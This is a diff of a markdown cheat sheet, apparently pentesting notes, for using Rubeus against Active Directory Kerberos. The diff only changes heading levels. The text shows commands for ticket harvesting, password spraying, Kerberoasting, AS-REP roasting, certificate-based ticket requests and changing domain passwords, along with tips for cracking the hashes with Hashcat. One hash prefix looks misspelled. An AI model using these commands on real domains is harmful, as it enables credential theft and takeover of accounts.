@@ -10,7 +10,7 @@ NOTE: To use Rebueus you need to already be on the domain you are attacking, or 
 * [Rubeus](https://github.com/GhostPack/Rubeus)
 * [Kerberos](kerberos.md)
 
-## Harvest Kerberos Tickets
+# Harvest Kerberos Tickets
 
 ```powershell
 # Harvest ticket granting tickets observed by the current machine.
@@ -19,7 +19,7 @@ NOTE: To use Rebueus you need to already be on the domain you are attacking, or 
 Rubeus.exe harvest /interval:30
 ```
 
-## Password Spraying
+# Password Spraying
 
 ```powershell
 # Spray the specified password across all known users and generate a
@@ -29,7 +29,7 @@ Rubeus.exe harvest /interval:30
 Rubeus.exe brute /password:ThePasswordToSpray /noticket
 ```
 
-## Kerberoasting
+# Kerberoasting
 
 ```powershell
 # Extract password hashes for all known kerberoastable accounts using
@@ -42,7 +42,7 @@ The password hashes output here can then be cracked with Hashcat (use the 13100 
 
 * [Using Hashcat](hashcat.md)
 
-## AS-REP Roasting
+# AS-REP Roasting
 
 ```powershell
 # AS-REP roasting with Rubeus.
@@ -52,7 +52,7 @@ Rubeus.exe asreproast
 
 To use Hashcat to crack the hashes obtained in this fashin, first insert `23$` after the leading `$kerb5asrep$` (so `$kerb5asrep$` -> `$kerb5asrep$23$`) and then use mode 18200.
 
-## Using a Certificate to Request a Ticket
+# Using a Certificate to Request a Ticket
 
 ```powershell
 # Request a ticket using a certificate from AD CS.
@@ -70,7 +70,7 @@ This is very useful if we've used an AD CS misconfiguration as described by Spec
 
 * [SpectreOps: Certified Pre-Owned](https://posts.specterops.io/certified-pre-owned-d95910965cd2)
 
-## Change a User's Password
+# Change a User's Password
 
 ```powershell
 # We can use Rubeus to change the password for domain users so long as
